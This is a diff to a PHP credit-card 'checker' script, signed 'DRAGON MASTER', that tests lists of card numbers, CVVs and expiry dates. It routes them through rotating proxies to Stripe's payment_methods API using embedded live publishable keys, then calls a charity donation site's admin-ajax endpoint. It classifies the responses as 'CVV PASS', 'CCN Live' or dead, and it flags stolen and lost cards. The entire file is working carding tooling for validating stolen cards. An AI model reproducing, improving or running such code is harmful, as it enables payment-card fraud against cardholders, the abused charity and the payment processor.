@@ -230,23 +230,23 @@ $ip = "Proxy Dead:[".$rotate."]";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/tokens',
+'path: /v1/payment_methods',
 'scheme: https',
 'accept: application/json',
-'accept-language: en-US',
+'accept-language: en-US,en;q=0.5',
 'content-type: application/x-www-form-urlencoded',
-'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -257,12 +257,54 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F78ef418)&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F99.0.4844.51+Safari%2F537.36&device_id=4fa5735f-5963-4e9e-9bc4-919b1befedc7&referrer=https%3A%2F%2Fwww.freeandwilling.com%2Ftransactions%2Fnew%3Fitem%3D12006&pasted_fields=number&time_checkout_opened=1646949361&time_checkout_loaded=1646949359&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=Infoff%40tablig.net&time_on_page=59968&guid=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&muid=38d9be5d-a54c-4e3e-a1f7-a2768d196779154f94&sid=53cbca6e-752f-46ba-9c53-478640f9fc9088c568&key=pk_live_mVAaIghclsy3joMFdBLOpPJ2');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&muid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8&sid=9361e11f-0030-4d05-98ac-f0c3fe1891e1ad5ea8&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=300116&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1031hI2bmikBJrxj');
 
-$result = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+$result1 = curl_exec($ch);
+//=======================[1 REQ-END]==============================//
+
+
+//=======================[2 REQ]==================================//
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
+curl_setopt($ch, CURLOPT_URL, 'https://www.viveperu.org/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'authority: www.viveperu.org',
+'method: POST',
+'path: /wp-admin/admin-ajax.php',
+'scheme: https',
+'accept: application/json, text/plain, */*',
+'accept-language: en-US,en;q=0.9,bn;q=0.8',
+'content-type: application/json;charset=UTF-8',
+'cookie: wp-give_session_5f36e31b0deaee977036bf5193ad2bed=e141e1703f04b9e16a6a250e79afae5e%7C%7C1647197454%7C%7C1647193854%7C%7C77eb84d1ff243a37f2492df27d788d95; wp-give_session_reset_nonce_5f36e31b0deaee977036bf5193ad2bed=1',
+'origin: https://www.viveperu.org',
+'referer: https://www.viveperu.org/donate-now/?form-id=204834&level-id=custom&custom-amount=1.00&payment-mode=stripe_checkout&form_id=204834',
+'sec-fetch-dest: empty',
+'sec-fetch-mode: cors',
+'sec-fetch-site: same-origin',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0',
+'x-requested-with: XMLHttpRequest',
+   ));
+
+# ----------------- [2req Postfields] ---------------------#
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'action=give_donation_form_reset_all_nonce&give_form_id=204834');
+
+
+$result2 = curl_exec($ch);
 $info = curl_getinfo($ch);
 $time = $info['total_time'];
+
+//=======================[2 REQ-END]==============================//
 
 
 //=======================[MADE BY]==============================//
@@ -278,11 +320,11 @@ $MADEBY = "[ (🇮🇳)DRAGON MASTER ]";
 
 # - [CVV Responses ] - #
 
-if ((strpos($result, '"cvc_check":"pass"')) || (strpos($result, "Thank You.")) || (strpos($result, 'Your card zip code is incorrect.')) || (strpos($result, "Thank You For Donation.")) || (strpos($result, "incorrect_zip")) || (strpos($result, "Success ")) || (strpos($result, '"type":"one-time"')) || (strpos($result, "/donations/thank_you?donation_number="))){
+if ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
     echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜  CVV PASS ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif ((strpos($result, "Your card has insufficient funds.")) || (strpos($result, '"cvc_check": "fail"'))){
+elseif ((strpos($result2, "Your card has insufficient funds.")) || (strpos($result2, '"cvc_check": "fail"'))){
     echo '<br><span class="badge badge-success">#CVV ✓ </span> : ' . $lista . ' ➜ R ➜ Your card has insufficient funds.  ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -291,7 +333,7 @@ elseif ((strpos($result, "Your card has insufficient funds.")) || (strpos($resul
 
 # - [CCN Responses ] - #
 
-elseif ((strpos($result, 'security code is incorrect.')) || (strpos($result, "security code is invalid.")) || (strpos($result, "Your card's security code is incorrect.")) || (strpos($result, "incorrect_cvc"))){
+elseif ((strpos($result2, 'security code is incorrect.')) || (strpos($result2, "security code is invalid.")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
     echo '<br><span class="badge badge-warning">#CCN ✓ </span> : ' . $lista . ' ➜  CCN Live ➜ </span> ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 
 }
@@ -301,7 +343,7 @@ elseif ((strpos($result, 'security code is incorrect.')) || (strpos($result, "se
 
 #- [Stolen,Lost,Pickup Responses]- #
 
-elseif ((strpos($result, 'stolen_card')) || (strpos($result, "lost_card")) || (strpos($result, "pickup_card."))){
+elseif ((strpos($result2, 'stolen_card')) || (strpos($result2, "lost_card")) || (strpos($result2, "pickup_card."))){
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -312,19 +354,19 @@ elseif ((strpos($result, 'stolen_card')) || (strpos($result, "lost_card")) || (s
 
 # -[Reprovada,Decline Responses ] - #
 
-elseif ((strpos($result, 'card was declined')) || (strpos($result1, "generic_decline")) || (strpos($result, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result, "processing_error")) || (strpos($result, "parameter_invalid_empty")) || (strpos($result, 'lock_timeout')) || (strpos($result, "transaction_not_allowed"))){
+elseif ((strpos($result2, 'card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif ((strpos($result, 'Payment cannot be processed, missing credit card number')) || (strpos($result, "missing_payment_information")) || (strpos($result, 'three_d_secure_redirect')) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, "service_not_allowed")) || (strpos($result, '"cvc_check": "unchecked"')) || (strpos($result, 'Your card does not support this type of purchase.')) || (strpos($result, "transaction_not_allowed"))){
+elseif ((strpos($result2, 'Payment cannot be processed, missing credit card number')) || (strpos($result2, "missing_payment_information")) || (strpos($result2, 'three_d_secure_redirect')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, "service_not_allowed")) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, 'Your card does not support this type of purchase.')) || (strpos($result2, "transaction_not_allowed"))){
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif (strpos($result1,  'Your card has expired.')) {
+elseif (strpos($result2,  'Your card has expired.')) {
   echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card has expired. ➜:  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
-elseif (strpos($result1,  'Your card number is incorrect.')) {
+elseif (strpos($result2,  'Your card number is incorrect.')) {
   echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Your card number is incorrect. ➜  DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
@@ -334,22 +376,22 @@ elseif (strpos($result1,  'Your card number is incorrect.')) {
 
 # - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] - #
 elseif 
-(strpos($result1,  '-1')) {
+(strpos($result2,  '-1')) {
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Update Nonce ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
 else {
     echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
+
 # - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
 //=======================[Responses-END]==============================//
-
 
 curl_close($ch);
 ob_flush();
 
-echo "<b>1REQ Result:</b> $result<br><br>";
-
+echo "<b>1REQ Result:</b> $result1<br><br>";
+echo "<b>2REQ Result:</b> $result2<br><br>";
 
 //=============================================================//
 //================[Made By :- [🇮🇳]DRAGON MASTER]===============//
